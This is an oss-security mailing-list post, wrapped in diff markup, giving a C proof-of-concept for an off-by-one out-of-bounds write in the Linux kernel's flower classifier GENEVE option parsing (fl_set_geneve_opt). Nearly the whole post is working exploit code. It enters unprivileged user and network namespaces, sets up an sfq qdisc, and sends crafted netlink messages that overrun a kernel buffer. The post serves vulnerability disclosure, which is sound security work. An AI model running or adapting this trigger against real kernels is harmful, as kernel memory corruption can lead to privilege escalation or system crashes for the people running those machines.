@@ -1,0 +1,284 @@
+
+Date: Mon, 12 Jun 2023 10:06:15 +0800
+From: Hangyu Hua <hbh25y@...il.com>
+To: oss-security@...ts.openwall.com
+Subject: Re: Linux kernel: off-by-one in fl_set_geneve_opt
+
+Hi guys,
+
+Here is the poc of this bug.
+
+This poc can't crash the kernel. But you can clearly see the oob write 
+through gdb.
+
+The poc code I tested on 6.4-rc3 is as follows:
+
+#define _GNU_SOURCE
+#include <stdio.h>
+#include <sched.h>
+#include <unistd.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/socket.h>
+#include <sys/wait.h>
+#include <sys/types.h>
+#include <sys/ipc.h>
+#include <sys/msg.h>
+#include <linux/netlink.h>
+#include <linux/pkt_sched.h>
+#include <linux/rtnetlink.h>
+#include <linux/pkt_cls.h>
+
+int qdist_create(int fd)
+{
+         char *start = malloc(0x1000);
+         struct nlmsghdr *nlh = (struct nlmsghdr *)start;
+
+         memset(start, 0, 0x1000);
+         printf("In qdist_create()\n");
+         // tcm
+         struct tcmsg *tcm;
+         tcm = (struct tcmsg *)(start + sizeof(struct nlmsghdr));
+         tcm->tcm_ifindex = 1;
+         tcm->tcm_family = AF_UNSPEC;
+         tcm->tcm_parent = TC_H_ROOT;
+         u_int32_t prio = 1;
+         u_int32_t protocol = 1;
+         tcm->tcm_info = TC_H_MAKE(prio << 16, protocol);
+         nlh->nlmsg_len = NLMSG_LENGTH(sizeof(struct tcmsg));
+
+         // TCA_KIND
+         struct nlattr *nla = (struct nlattr *)(start +
+NLMSG_ALIGN(nlh->nlmsg_len));
+         char kind_data[4] = "sfq";
+         nla->nla_type = TCA_KIND;
+         nla->nla_len = NLA_ALIGN(NLA_HDRLEN + sizeof(kind_data));
+         memcpy((char *)nla + NLA_HDRLEN, kind_data, sizeof(kind_data));
+         nlh->nlmsg_len = nlh->nlmsg_len + nla->nla_len;
+
+         struct iovec iov = {
+                 .iov_base = nlh,
+                 .iov_len = nlh->nlmsg_len
+         };
+         struct sockaddr_nl nladdr = {
+                 .nl_family = AF_NETLINK
+         };
+         struct msghdr msg = {
+                 .msg_name = &nladdr,
+                 .msg_namelen = sizeof(nladdr),
+                 .msg_iov = &iov,
+                 .msg_iovlen = 1
+         };
+
+         nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_EXCL | NLM_F_CREATE;
+         nlh->nlmsg_type = RTM_NEWQDISC;
+
+
+         if (sendmsg(fd, &msg, 0) < 0) {
+                 printf("qdist fail");
+                 return -1;
+         }
+         printf("qdist_create() over\n");
+         return 0;
+}
+
+int filter_create(int fd)
+{
+         char *start = malloc(0x2000);
+         struct nlmsghdr *nlh = (struct nlmsghdr *)start;
+
+         memset(start, 0, 0x2000);
+         printf("In filter_create()\n");
+         // tcm
+         struct tcmsg *tcm = (struct tcmsg *)(start + sizeof(struct 
+nlmsghdr));
+         tcm->tcm_ifindex = 1;
+         tcm->tcm_family = AF_UNSPEC;
+         u_int32_t prio = 1;
+         u_int32_t protocol = 1;
+         tcm->tcm_info = TC_H_MAKE(prio << 16, protocol);
+         nlh->nlmsg_len = NLMSG_LENGTH(sizeof(struct tcmsg));
+
+         // TCA_KIND
+         struct nlattr *nla = (struct nlattr *)(start +
+NLMSG_ALIGN(nlh->nlmsg_len));
+         char kind_data[7] = "flower";
+         nla->nla_type = TCA_KIND;
+         nla->nla_len = NLA_ALIGN(NLA_HDRLEN + sizeof(kind_data));
+         memcpy((char *)nla + NLA_HDRLEN, kind_data, sizeof(kind_data));
+         nlh->nlmsg_len = NLMSG_ALIGN(nlh->nlmsg_len) + nla->nla_len;
+
+         // TCA_OPTIONS start
+         nla = (struct nlattr *)(start + NLMSG_ALIGN(nlh->nlmsg_len));
+         nla->nla_type = TCA_OPTIONS;
+         nla->nla_len = NLA_HDRLEN;
+         nlh->nlmsg_len = NLMSG_ALIGN(nlh->nlmsg_len) + nla->nla_len;
+
+         struct nlattr *opt_nla = (struct nlattr *)(start +
+NLMSG_ALIGN(nlh->nlmsg_len));
+         opt_nla->nla_type = TCA_FLOWER_KEY_ENC_OPTS;
+         opt_nla->nla_len = NLA_HDRLEN;
+         nlh->nlmsg_len = NLMSG_ALIGN(nlh->nlmsg_len) + opt_nla->nla_len;
+
+         // 1
+         struct nlattr *gen_nla = (struct nlattr *)(start +
+NLMSG_ALIGN(nlh->nlmsg_len));
+         gen_nla->nla_type = TCA_FLOWER_KEY_ENC_OPTS_GENEVE;
+         gen_nla->nla_len = NLA_HDRLEN;
+         nlh->nlmsg_len = NLMSG_ALIGN(nlh->nlmsg_len) + gen_nla->nla_len;
+
+         struct nlattr *data_nla = (struct nlattr *)(start +
+NLMSG_ALIGN(nlh->nlmsg_len));
+         char gen_data_1[124];
+         for (int i = 0; i < 124; i++) {
+                 gen_data_1[i] = 'A';
+         }
+         data_nla->nla_type = TCA_FLOWER_KEY_ENC_OPT_GENEVE_DATA;
+         data_nla->nla_len = NLA_ALIGN(NLA_HDRLEN + sizeof(gen_data_1));
+         memcpy((char *)data_nla + NLA_HDRLEN, gen_data_1, 
+sizeof(gen_data_1));
+         gen_nla->nla_len = NLA_ALIGN(gen_nla->nla_len) + data_nla->nla_len;
+         nlh->nlmsg_len = NLMSG_ALIGN(nlh->nlmsg_len) + data_nla->nla_len;
+
+         data_nla = (struct nlattr *)(start + NLMSG_ALIGN(nlh->nlmsg_len));
+         u_int16_t *gen_class = (u_int16_t *)((char *) data_nla + 
+NLA_HDRLEN);
+         data_nla->nla_type = TCA_FLOWER_KEY_ENC_OPT_GENEVE_CLASS;
+         data_nla->nla_len = NLA_ALIGN(NLA_HDRLEN + sizeof(u_int16_t));
+         *gen_class = 1;
+         gen_nla->nla_len = NLA_ALIGN(gen_nla->nla_len) + data_nla->nla_len;
+         nlh->nlmsg_len = NLMSG_ALIGN(nlh->nlmsg_len) + data_nla->nla_len;
+
+         data_nla = (struct nlattr *)(start + NLMSG_ALIGN(nlh->nlmsg_len));
+         u_int8_t *gen_type = (u_int8_t *)((char *) data_nla + NLA_HDRLEN);
+         data_nla->nla_type = TCA_FLOWER_KEY_ENC_OPT_GENEVE_TYPE;
+         data_nla->nla_len = NLA_ALIGN(NLA_HDRLEN + sizeof(u_int8_t));
+         *gen_type = 1;
+         gen_nla->nla_len = NLA_ALIGN(gen_nla->nla_len) + data_nla->nla_len;
+         nlh->nlmsg_len = NLMSG_ALIGN(nlh->nlmsg_len) + data_nla->nla_len;
+
+         // 2
+         struct nlattr *gen_nla_2 = (struct nlattr *)(start +
+NLMSG_ALIGN(nlh->nlmsg_len));
+         gen_nla_2->nla_type = TCA_FLOWER_KEY_ENC_OPTS_GENEVE;
+         gen_nla_2->nla_len = NLA_HDRLEN;
+         nlh->nlmsg_len = NLMSG_ALIGN(nlh->nlmsg_len) + gen_nla_2->nla_len;
+
+         data_nla = (struct nlattr *)(start + NLMSG_ALIGN(nlh->nlmsg_len));
+         char gen_data_2[120];
+         for (int i = 0; i < 120; i++) {
+                 gen_data_2[i] = 'A';
+         }
+         data_nla->nla_type =    TCA_FLOWER_KEY_ENC_OPT_GENEVE_DATA;
+         data_nla->nla_len =     NLA_ALIGN(NLA_HDRLEN + sizeof(gen_data_2));
+         memcpy((char *)data_nla + NLA_HDRLEN, gen_data_2, 
+sizeof(gen_data_2));
+         gen_nla_2->nla_len = NLA_ALIGN(gen_nla_2->nla_len) + 
+data_nla->nla_len;
+         nlh->nlmsg_len = NLMSG_ALIGN(nlh->nlmsg_len) + data_nla->nla_len;
+
+         data_nla = (struct nlattr *)(start + NLMSG_ALIGN(nlh->nlmsg_len));
+         gen_class = (u_int16_t *)((char *) data_nla + NLA_HDRLEN);
+         data_nla->nla_type = TCA_FLOWER_KEY_ENC_OPT_GENEVE_CLASS;
+         data_nla->nla_len = NLA_ALIGN(NLA_HDRLEN + sizeof(u_int16_t));
+         *gen_class = 1;
+         gen_nla_2->nla_len = NLA_ALIGN(gen_nla_2->nla_len) + 
+data_nla->nla_len;
+         nlh->nlmsg_len = NLMSG_ALIGN(nlh->nlmsg_len) + data_nla->nla_len;
+
+         data_nla = (struct nlattr *)(start + NLMSG_ALIGN(nlh->nlmsg_len));
+         gen_type = (u_int8_t *)((char *) data_nla + NLA_HDRLEN);
+         data_nla->nla_type = TCA_FLOWER_KEY_ENC_OPT_GENEVE_TYPE;
+         data_nla->nla_len = NLA_ALIGN(NLA_HDRLEN + sizeof(u_int8_t));
+         *gen_type = 1;
+         gen_nla_2->nla_len = NLA_ALIGN(gen_nla_2->nla_len) + 
+data_nla->nla_len;
+         nlh->nlmsg_len = NLMSG_ALIGN(nlh->nlmsg_len) + data_nla->nla_len;
+
+         // 3
+         struct nlattr *gen_nla_3 = (struct nlattr *)(start +
+NLMSG_ALIGN(nlh->nlmsg_len));
+         gen_nla_3->nla_type = TCA_FLOWER_KEY_ENC_OPTS_GENEVE;
+         gen_nla_3->nla_len = NLA_HDRLEN;
+         nlh->nlmsg_len = NLMSG_ALIGN(nlh->nlmsg_len) + gen_nla_3->nla_len;
+
+         data_nla = (struct nlattr *)(start + NLMSG_ALIGN(nlh->nlmsg_len));
+         char gen_data_3[120];
+         for (int i = 0; i < 120; i++) {
+                 gen_data_3[i] = 'B';
+         }
+         data_nla->nla_type =    TCA_FLOWER_KEY_ENC_OPT_GENEVE_DATA;
+         data_nla->nla_len =     NLA_ALIGN(NLA_HDRLEN + sizeof(gen_data_3));
+         memcpy((char *)data_nla + NLA_HDRLEN, gen_data_3, 
+sizeof(gen_data_3));
+         gen_nla_3->nla_len = NLA_ALIGN(gen_nla_3->nla_len) + 
+data_nla->nla_len;
+         nlh->nlmsg_len = NLMSG_ALIGN(nlh->nlmsg_len) + data_nla->nla_len;
+
+         data_nla = (struct nlattr *)(start + NLMSG_ALIGN(nlh->nlmsg_len));
+         gen_class = (u_int16_t *)((char *) data_nla + NLA_HDRLEN);
+         data_nla->nla_type = TCA_FLOWER_KEY_ENC_OPT_GENEVE_CLASS;
+         data_nla->nla_len = NLA_ALIGN(NLA_HDRLEN + sizeof(u_int16_t));
+         *gen_class = 1;
+         gen_nla_3->nla_len = NLA_ALIGN(gen_nla_3->nla_len) + 
+data_nla->nla_len;
+         nlh->nlmsg_len = NLMSG_ALIGN(nlh->nlmsg_len) + data_nla->nla_len;
+
+         data_nla = (struct nlattr *)(start + NLMSG_ALIGN(nlh->nlmsg_len));
+         gen_type = (u_int8_t *)((char *) data_nla + NLA_HDRLEN);
+         data_nla->nla_type = TCA_FLOWER_KEY_ENC_OPT_GENEVE_TYPE;
+         data_nla->nla_len = NLA_ALIGN(NLA_HDRLEN + sizeof(u_int8_t));
+         *gen_type = 1;
+         gen_nla_3->nla_len = NLA_ALIGN(gen_nla_3->nla_len) + 
+data_nla->nla_len;
+         nlh->nlmsg_len = NLMSG_ALIGN(nlh->nlmsg_len) + data_nla->nla_len;
+
+         opt_nla->nla_len = NLA_ALIGN(opt_nla->nla_len) + gen_nla->nla_len +
+gen_nla_2->nla_len + gen_nla_3->nla_len;
+         nla->nla_len = NLA_ALIGN(nla->nla_len) + opt_nla->nla_len;
+         // TCA_OPTIONS end
+
+         struct iovec iov = {
+                 .iov_base = nlh,
+                 .iov_len = nlh->nlmsg_len
+         };
+         struct sockaddr_nl nladdr = {
+                 .nl_family = AF_NETLINK
+         };
+         struct msghdr msg = {
+                 .msg_name = &nladdr,
+                 .msg_namelen = sizeof(nladdr),
+                 .msg_iov = &iov,
+                 .msg_iovlen = 1
+         };
+
+         nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_EXCL | NLM_F_CREATE;
+         nlh->nlmsg_type = RTM_NEWTFILTER;
+
+         if (sendmsg(fd, &msg, 0) < 0) {
+                 printf("filter create");
+         }
+         printf("filter_create over\n");
+         return 0;
+}
+
+int main()
+{
+         int socket_fd;
+
+         unshare(CLONE_NEWUSER|CLONE_NEWNET);
+         socket_fd = socket(PF_NETLINK, SOCK_RAW, 0);
+         if (socket_fd > 0) {
+                 printf("%d\n", socket_fd);
+         } else {
+                 printf("socket create:");
+                 return -1;
+         }
+
+         qdist_create(socket_fd);
+         filter_create(socket_fd);
+
+}
+
+Thanks,
+Hangyu
